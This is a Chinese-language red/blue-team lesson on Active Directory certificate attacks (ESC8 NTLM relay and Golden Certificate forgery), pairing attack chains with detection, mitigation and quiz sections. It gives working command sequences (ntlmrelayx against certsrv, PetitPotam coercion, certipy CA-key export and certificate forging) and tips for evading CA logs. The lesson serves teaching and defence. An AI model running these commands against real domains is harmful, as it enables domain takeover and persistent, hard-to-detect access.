# R17.7 企業憑證身分信任錨點操縱與金憑證分析 (Trust Anchor Manipulation & Golden Certificate)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**企業憑證信任錨點操縱與黃金憑證 (Golden Certificate / ESC8)** 代表 Active Directory 憑證體系中最極致的兩大攻擊向量：**跨協定中繼 (Cross-Protocol Relay)** 與**根金鑰偽造 (Root Key Forgery)**。其本質為：
1. **ESC8 (Web 註冊 NTLM 中繼)**：CA 伺服器的 HTTP 註冊端點 (`/certsrv/`) 預設缺乏擴充保護 (EPA)，且未強制 SMB/HTTP 簽章；攻擊者強迫網域控制站 (DC) 發起 NTLM 驗證並中繼至 CA，直接冒名簽發出 DC 自身的機器憑證，進而發動 DCSync 接管全網。
2. **黃金憑證 (Golden Certificate)**：攻擊者攻陷 CA 主機並導出 CA 的根私鑰；隨後在攻擊機**完全離線**偽造簽發全網任意帳號的有效登入憑證，整個過程**完全不與 CA 進行任何通訊，CA 日誌中零痕跡**。

```
[攻擊鏈 A：ESC8 Web 註冊 NTLM 中繼]
[攻擊者] ── 1. 強迫連線 (PetitPotam / Coerce) ──► [網域控制站 (DC01)]
                                                        │
                                                        ▼ 2. DC01 向攻擊者發起 SMB 驗證
[ntlmrelayx 攔截] ── 3. 中繼 NTLM 至 CA HTTP: http://ca.corp.com/certsrv/
         │
         ▼ 4. 以 DC01$ 機器帳號身分申請機器憑證 ➔ 成功獲取 DC01.pfx！
[發動 DCSync (R16.1)] ◄─────────────────────────┘

-------------------------------------------------------------------------
[攻擊鏈 B：黃金憑證 (Golden Certificate 離線偽造)]
[攻陷 CA 主機] ── 1. 導出 CA 根憑證與私鑰 (ca.pfx)
         │
         ▼ 2. 轉移至外部離線攻擊機
[攻擊者離線控制台] ── 3. 呼叫 certipy forge -ca-pfx ca.pfx -upn Administrator
         │
         ▼ 4. 離線生成有效期限長達 10 年之 Administrator.pfx (CA 伺服器零通訊、零日誌！)
[Kerberos PKINIT] ──► 直連 KDC 換取 TGT ➔ 實現永恆幽靈後門！
```

## 🔬 第一動：Web 註冊 NTLM 中繼與 CA 根金鑰物理架構 (Mechanics & Trust Anchors)

### 1. ESC8 跨協定中繼成因矩陣

| 架構節點 | 預設危險配置 | 攻擊利用物理條件 |
| :--- | :--- | :--- |
| **CA Web Enrollment** | 安裝了 `Certification Authority Web Enrollment` | 啟用 HTTP 站點，路徑為 `/certsrv/` |
| **IIS 驗證配置** | 僅啟用 `Windows Authentication` | **未啟用擴充保護 (EPA: Extended Protection for Authentication)** |
| **通道安全** | 允許未加密 HTTP 明文連線 | 缺少 Channel Binding Tokens (CBT) 防護 |

### 2. 黃金憑證 (Golden Certificate) 信任機制
Active Directory 將 CA 的根憑證發布在 `CN=NTAuthCertificates` 容器中。只要證書是由該容器所信任的 CA 私鑰簽發，且主體包含合法 UPN，**網域控制站 (KDC) 就會 100% 信任該證書並發放 TGT，即使該帳號後續變更了密碼，該憑證依然持續有效**！

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心利用指令速查表 (Certipy / Impacket)

#### 1. ESC8 跨協定 NTLM 中繼利用 ( PetitPotam + ntlmrelayx )
```bash
# 步驟 1: 啟動 ntlmrelayx 監聽並鎖定 CA Web 端點
impacket-ntlmrelayx -t http://ca.corp.internal/certsrv/certfnsh.asp \
    -smb2support --template DomainController

# 步驟 2: 強迫網域控制站向攻擊機發起連線 (PetitPotam)
python3 petitpotam.py 10.0.0.99 10.0.0.1  # 攻擊機 IP: 10.0.0.99 / DC IP: 10.0.0.1
# ntlmrelayx 成功中繼並導出 dc01.pfx！

# 步驟 3: 利用機器憑證直接進行 DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
```

#### 2. 黃金憑證 (Golden Certificate) 導出與離線鍛造
```bash
# 步驟 1: 備份並導出 CA 私鑰 (需具備 CA 主機本機管理員或 ManageCA 特權)
certipy ca -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -backup -dc-ip 10.0.0.1
# 輸出: CORP-CA.pfx (包含 CA 根私鑰)

# 步驟 2: 離線偽造簽發管理員黃金憑證 (完全不連網)
certipy forge -ca-pfx CORP-CA.pfx -upn "administrator@corp.internal" \
    -subject "CN=Administrator,CN=Users,DC=corp,DC=internal"
# 輸出: forged_administrator.pfx

# 步驟 3: 隨時發起 PKINIT 換取 TGT
certipy auth -pfx forged_administrator.pfx -dc-ip 10.0.0.1
```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **黃金憑證終極防禦規避**：
  - 攻擊者離線產製憑證，CA 伺服器**無任何申請或簽發事件 (無 Event 4886/4887)**。
  - 帳號變更密碼無法阻斷憑證登入；即便網域進行大規模密碼重置，攻擊者依然能持續換取 TGT。
- **鑑識與遙測特徵**：
  - **ESC8 中繼特徵 (Event ID 4887)**：CA Web 伺服器記錄來自非預期 IP 的 NTLM 驗證，緊接著以 DC 機器帳號身分頒發憑證。
  - **KDC 憑證流水號異常**：分析 Event ID 4768 中的憑證序號 (Certificate Serial Number)，比對 CA 資料庫**發現該序號根本不存在於 CA 資料庫中**（離線鍛造的鐵證！）。

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

| 攻擊模式 (Offense) | 藍隊遙測指標 (Blue Telemetry) | 防禦基線反制 (Mitigation Baseline) | 繞過與殘餘考量 (Residual Seam) |
| :--- | :--- | :--- | :--- |
| **ESC8 NTLM 中繼** | IIS 出現來自 DC 帳號的 NTLM 登入 | 移除 Web 註冊角色；或強制啟用 HTTPS + EPA | 尋找企業內部其他啟用 NTLM 的 HTTP 註冊站台 |
| **強制主機連線 (Coerce)** | 網路監控捕獲 MS-EFSR / MS-RPRN RPC 呼叫 | 停用 Spooler 服務；安裝 RPC 過濾微軟補丁 | 利用 WebDAV 或未修復之新型 RPC 強迫連線 |
| **黃金憑證離線偽造** | KDC 出現未記錄於 CA 資料庫之憑證序號 | 採用硬體安全模組 (HSM) 保存 CA 根私鑰 | CA 若遭全面吊銷重置將引發全域業務中斷 |

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. 根治 ESC8：強制啟用擴充保護 (EPA) 與 HTTPS
在 CA 伺服器的 IIS 管理員中：
1. 進入 `CertSrv` 應用程式 ➔ **驗證 (Authentication)**；
2. 開啟 **Windows 驗證 (Windows Authentication)** 的進階設定：
   - 將 **擴充保護 (Extended Protection)** 改選為 **`Required`**；
   - 勾選 **`Enable Kernel-mode authentication`**；
3. 在 **SSL 設定** 中強制勾選 **`Require SSL (需要 SSL)`**，徹底杜絕 HTTP 明文 NTLM 中繼。

### 2. 徹底阻絕強迫連線 (Coerce Mitigation)
- 在所有網域控制站上徹底停用列印排程器服務：
  ```powershell
  Stop-Service -Name Spooler -Force
  Set-Service -Name Spooler -StartupType Disabled
  ```

### 3. 黃金憑證防禦：硬體安全模組 (HSM)
企業根 CA 與從屬 CA 私鑰必須封裝於實體 **硬體安全模組 (HSM)** 中，確保即使作業系統遭到破壞，攻擊者也絕對無法匯出 CA 私鑰明文。

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 什麼是 AD CS ESC8 弱點？為什麼它能讓攻擊者直接奪取網域最高權限？**  
  *分析思路*：CA 的 Web Enrollment HTTP 介面未開啟 NTLM 擴充保護 (EPA)；攻擊者透過 PetitPotam 強迫網域控制站連線並中繼其 NTLM 憑證至 CA，直接冒充 DC 申請到合法機器憑證，並藉此發動 DCSync 提取全域金鑰。

- [ ] **Q2. 什麼是黃金憑證 (Golden Certificate)？其相比黃金票據 (Golden Ticket) 有何更可怕的持久性？**  
  *分析思路*：黃金票據依賴 `krbtgt` 帳號密碼，重置兩次 `krbtgt` 即可徹底失效；而黃金憑證是利用 CA 根私鑰簽發，只要 CA 根憑證未到期或未被全域吊銷，即使使用者重置密碼，偽造的證書依然能持續簽發合法 TGT，持久性長達數年。

- [ ] **Q3. 離線鍛造的黃金憑證在與 KDC 進行 Kerberos PKINIT 驗證時，為何不會被識破？**  
  *分析思路*：KDC 在驗證憑證時，僅校驗該憑證的數位簽名是否由 `NTAuthCertificates` 中的受信任 CA 私鑰所簽發，以及有效期限與吊銷清單；KDC 本身不會向 CA 伺服器即時查詢該憑證是否存在於簽發記錄中。

- [ ] **Q4. 藍隊要如何鑑別出網域內有人正在使用離線偽造的黃金憑證？**  
  *分析思路*：對照 KDC 上的 Event ID 4768 記錄的憑證序號 (Serial Number) 與 CA 實例資料庫；若發現某個成功登入的憑證序號根本不存在於 CA 頒發資料庫中，即可 100% 判定為黃金憑證攻擊。

- [ ] **Q5. 徹底防範 ESC8 與黃金憑證的黃金加固原則為何？**  
  *分析思路*：
  1. 對於 ESC8：停用非必要的 Web Enrollment，或強制要求 HTTPS 與 EPA；停用 DC 上的 Spooler 服務。
  2. 對於黃金憑證：將 CA 私鑰儲存於硬體安全模組 (HSM) 禁止匯出，嚴格限制 CA 主機的本機管理員權限。
